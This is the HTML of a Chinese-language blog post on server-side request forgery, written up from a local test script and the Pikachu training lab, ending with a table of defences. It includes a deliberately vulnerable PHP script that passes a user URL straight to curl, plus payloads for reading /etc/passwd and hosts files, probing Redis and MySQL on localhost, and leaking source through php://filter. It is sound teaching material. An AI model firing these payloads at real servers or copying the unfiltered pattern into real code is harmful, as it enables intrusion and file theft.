@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"byroins.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.28.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":2,"unescape":true,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Environment: PHP 7.3.4 + MySQL 5.7.26Lab: Pikachu  1.0 SSRF1.1 什么是SSRFSSRF(Server-Side Request Forgery, 服务端请求伪造): 服务器在没有对目标地址做有效过滤的情况下, 替攻击者向任意地址发起请求, 攻击者相当于把服务器当成了”跳板机” 1.2 根因用户可控的 URL &#x2F; 资源标识符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/index.html">
+<meta property="og:site_name" content="Byron">
+<meta property="og:description" content="Environment: PHP 7.3.4 + MySQL 5.7.26Lab: Pikachu  1.0 SSRF1.1 什么是SSRFSSRF(Server-Side Request Forgery, 服务端请求伪造): 服务器在没有对目标地址做有效过滤的情况下, 替攻击者向任意地址发起请求, 攻击者相当于把服务器当成了”跳板机” 1.2 根因用户可控的 URL &#x2F; 资源标识符">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/1.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/2.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/3.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/4.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/5.png">
+<meta property="article:published_time" content="2026-08-07T14:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-09T12:02:39.199Z">
+<meta property="article:author" content="Byron">
+<meta property="article:tag" content="curl">
+<meta property="article:tag" content="dict">
+<meta property="article:tag" content="file">
+<meta property="article:tag" content="gopher">
+<meta property="article:tag" content="pikachu">
+<meta property="article:tag" content="ssrf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/1.png">
+
+
+<link rel="canonical" href="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/","path":"2026/08/07/web-security/ssrf/2026-08-07-ssrf/","title":"SSRF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SSRF | Byron</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Byron" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Byron</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Web Application Security Research & Exploit Development</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-0-SSRF"><span class="nav-number">1.</span> <span class="nav-text">1.0 SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AFSSRF"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 什么是SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%A0%B9%E5%9B%A0"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 根因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 常见危险函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E5%88%86%E7%B1%BB"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.6.</span> <span class="nav-text">2.0 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-0-1-php%E5%87%BD%E6%95%B0"><span class="nav-number">1.6.1.</span> <span class="nav-text">2.0.1 php函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-0-2-CURL%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.6.2.</span> <span class="nav-text">2.0.2  CURL协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Pass-01-%E6%9C%AC%E5%9C%B0%E7%BC%96%E5%86%99%E6%B5%8B%E8%AF%95"><span class="nav-number">1.6.3.</span> <span class="nav-text">2.1 Pass-01-本地编写测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Pikachu%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C"><span class="nav-number">1.6.4.</span> <span class="nav-text">2.2 Pikachu靶场实验</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-0-%E9%98%B2%E5%BE%A1"><span class="nav-number">1.7.</span> <span class="nav-text">3.0 防御</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Byron"
+      src="/images/private/icon1.png">
+  <p class="site-author-name" itemprop="name">Byron</p>
+  <div class="site-description" itemprop="description">Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/byroins/penetration-testing" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;byroins&#x2F;penetration-testing" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SSRF | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSRF
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-08-07 22:00:00" itemprop="dateCreated datePublished" datetime="2026-08-07T22:00:00+08:00">2026-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-08-09 20:02:39" itemprop="dateModified" datetime="2026-08-09T20:02:39+08:00">2026-08-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/ssrf/" itemprop="url" rel="index"><span itemprop="name">ssrf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: Pikachu</p>
+</blockquote>
+<h1 id="1-0-SSRF"><a href="#1-0-SSRF" class="headerlink" title="1.0 SSRF"></a>1.0 SSRF</h1><h3 id="1-1-什么是SSRF"><a href="#1-1-什么是SSRF" class="headerlink" title="1.1 什么是SSRF"></a>1.1 什么是SSRF</h3><p><strong>SSRF</strong>(Server-Side Request Forgery, 服务端请求伪造): 服务器在<strong>没有对目标地址做有效过滤</strong>的情况下, 替攻击者向任意地址发起请求, 攻击者相当于把服务器当成了”跳板机”</p>
+<h3 id="1-2-根因"><a href="#1-2-根因" class="headerlink" title="1.2 根因"></a>1.2 根因</h3><p><strong>用户可控的 URL &#x2F; 资源标识符 → 进入了网络请求函数, 且无过滤</strong> 和文件包含 <code>include($_GET[&#39;file&#39;])</code> 是同一类</p>
+<h3 id="1-3-常见危险函数"><a href="#1-3-常见危险函数" class="headerlink" title="1.3 常见危险函数"></a>1.3 常见危险函数</h3><table>
+<thead>
+<tr>
+<th>语言</th>
+<th>危险函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP</td>
+<td><code>curl</code>、<code>file_get_contents</code>、<code>fsockopen</code>、<code>fopen</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td><code>requests</code>、<code>urllib</code></td>
+</tr>
+<tr>
+<td>Java</td>
+<td><code>URL.openConnection</code>、<code>HttpClient</code></td>
+</tr>
+</tbody></table>
+<h3 id="1-4-分类"><a href="#1-4-分类" class="headerlink" title="1.4 分类"></a>1.4 分类</h3><ul>
+<li>有回显SSRF: 内网响应直接返回给攻击者</li>
+<li>无回显SSRF(Blind): 无回显, 需要 DNSLog &#x2F; 时间差等侧信道确认和利用</li>
+</ul>
+<h3 id="1-5-漏洞危害"><a href="#1-5-漏洞危害" class="headerlink" title="1.5 漏洞危害"></a>1.5 漏洞危害</h3><table>
+<thead>
+<tr>
+<th>危害</th>
+<th>说明</th>
+<th>典型 payload 协议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>读服务器本地文件</td>
+<td>读 <code>/etc/passwd</code>、<code>win.ini</code></td>
+<td><code>file://</code></td>
+</tr>
+<tr>
+<td>内网端口扫描 &#x2F; 服务探测</td>
+<td>扫存活主机、探测 Redis&#x2F;MySQL</td>
+<td><code>http://</code>、<code>dict://</code></td>
+</tr>
+<tr>
+<td>攻击内网未授权服务</td>
+<td>打 Redis 写 webshell → RCE</td>
+<td><code>gopher://</code></td>
+</tr>
+<tr>
+<td>云凭据窃取</td>
+<td>偷 AWS&#x2F;阿里云 IAM 临时凭据</td>
+<td><code>http://169.254.169.254</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>协议就是 SSRF 的武器库: <code>file</code> 读文件、<code>dict</code> 探服务、<code>gopher</code> 发任意 TCP 字节流(万能)</p>
+</blockquote>
+<hr>
+<h2 id="2-0-漏洞利用"><a href="#2-0-漏洞利用" class="headerlink" title="2.0 漏洞利用"></a>2.0 漏洞利用</h2><h3 id="2-0-1-php函数"><a href="#2-0-1-php函数" class="headerlink" title="2.0.1 php函数"></a>2.0.1 php函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>curl_exec()</td>
+<td>执行cURL会话</td>
+</tr>
+<tr>
+<td>file_get_contents()</td>
+<td>获取整个文件</td>
+</tr>
+<tr>
+<td>fsockopen()</td>
+<td>打开一个网络连接或者一个Unix套接字连接</td>
+</tr>
+</tbody></table>
+<h3 id="2-0-2-CURL协议"><a href="#2-0-2-CURL协议" class="headerlink" title="2.0.2  CURL协议"></a>2.0.2  CURL协议</h3><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file</td>
+<td>查看文件</td>
+</tr>
+<tr>
+<td>dict</td>
+<td>探测端口</td>
+</tr>
+<tr>
+<td>gopher</td>
+<td>发送任意 TCP 原始字节流<br>可打 Redis&#x2F;MySQL&#x2F;FastCGI 写 webshell, 进而 RCE</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="2-1-Pass-01-本地编写测试"><a href="#2-1-Pass-01-本地编写测试" class="headerlink" title="2.1 Pass-01-本地编写测试"></a>2.1 Pass-01-本地编写测试</h3><p><code>ssrf1.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="comment">// 设置URL及选项</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="comment">// 关闭cURL资源, 并释放系统资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>http请求类(确认漏洞存在)</p>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/1.png"></p>
+<blockquote>
+<p>通过Payload<code>?url=http://www.baidu.com</code>成功跳转链接</p>
+</blockquote>
+</li>
+<li><p>本地文件读取(file)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=file:<span class="comment">///c:/windows/win.ini # Windows</span></span><br><span class="line">?url=file:<span class="comment">///etc/passwd         # Linux</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/2.png"></p>
+<blockquote>
+<p>成功读取到win.ini内容</p>
+</blockquote>
+</li>
+<li><p>探测内网服务(http&#x2F;dict)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.1:81/            # 访问自己，验证内网可达</span></span><br><span class="line">?url=dict:<span class="comment">//127.0.0.1:6379/info      # 探测 Redis 未授权</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>扫描思路: 通过响应差异 &#x2F; 时间差判断端口是否开放</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="2-2-Pikachu靶场实验"><a href="#2-2-Pikachu靶场实验" class="headerlink" title="2.2 Pikachu靶场实验"></a>2.2 Pikachu靶场实验</h3><ul>
+<li><p>端口探测(curl)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict:<span class="comment">//127.0.0.1:3306</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/3.png"></p>
+<blockquote>
+<p>探测到mysql端口开放</p>
+</blockquote>
+</li>
+<li><p>读取本机hosts文件(curl)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:<span class="comment">///c:windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/4.png"></p>
+</li>
+<li><p>文件读取(file_get_contents)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file:<span class="comment">//c:windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过php伪协议读取源码(file_get_contents)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=ssrf.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/5.png"></p>
+<blockquote>
+<p>解码后与源码一致, 成功读取</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h2 id="3-0-防御"><a href="#3-0-防御" class="headerlink" title="3.0 防御"></a>3.0 防御</h2><table>
+<thead>
+<tr>
+<th>防御措施</th>
+<th>防什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>协议白名单(只放 http&#x2F;https)</td>
+<td>file&#x2F;dict&#x2F;gopher</td>
+</tr>
+<tr>
+<td>解析后校验 IP(禁私网&#x2F;回环&#x2F;链路本地)</td>
+<td>直连内网</td>
+</tr>
+<tr>
+<td>禁用 <code>CURLOPT_FOLLOWLOCATION</code></td>
+<td>302 跳转绕过</td>
+</tr>
+<tr>
+<td><code>CURLOPT_RESOLVE</code> 锁定 IP</td>
+<td>DNS Rebinding（关键）</td>
+</tr>
+<tr>
+<td>出口防火墙 &#x2F; 网络隔离</td>
+<td>纵深兜底</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ssrf/" rel="tag"># ssrf</a>
+              <a href="/tags/curl/" rel="tag"># curl</a>
+              <a href="/tags/file/" rel="tag"># file</a>
+              <a href="/tags/dict/" rel="tag"># dict</a>
+              <a href="/tags/pikachu/" rel="tag"># pikachu</a>
+              <a href="/tags/gopher/" rel="tag"># gopher</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/08/04/web-security/upload-file/2026-08-04-include-file/" rel="prev" title="Include-File">
+                  <i class="fa fa-angle-left"></i> Include-File
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments utterances-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Byron</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="utterances" type="application/json">{"enable":true,"repo":"byroins/penetration-testing","issue_term":"pathname","theme":"github-light"}</script>
+<script src="/js/third-party/comments/utterances.js" defer></script>
+
+</body>
+</html>
